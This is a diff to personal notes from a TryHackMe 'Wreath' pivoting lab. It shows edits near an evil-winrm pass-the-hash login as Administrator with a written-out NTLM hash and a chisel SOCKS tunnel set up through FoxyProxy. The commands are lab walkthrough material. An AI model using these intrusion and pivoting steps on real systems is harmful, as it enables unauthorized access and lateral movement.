@@ -20,7 +20,8 @@ Whether you choose the recommended option or not, get a pivot up and running!
 
 # Your job
 
-1. For pivoting, we can use chisel. Run evil-winrm . #Attacking_Machine 
+ #Attacking_Machine 
+1. For pivoting, we can use chisel. Run evil-winrm .
 ```
 evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s /home/kali/Tryhackme/Wreath/Chisel_1.7.7
 ```
@@ -64,7 +65,7 @@ chisel client 10.200.84.150:18456 9090:socks
 
 ![[Screenshot from 2025-02-21 11-50-16.png]]
 
-Now the socks proxy is opened on port 9090 of our port
+Now the socks proxy is opened on port 9090 of our port.
 
 9. Setup FoxyProxy: Ensure you setup a `SOCKS5` proxy with *foxyproxy*:
 	 ![[Pivoting-20250126190740769.webp]]
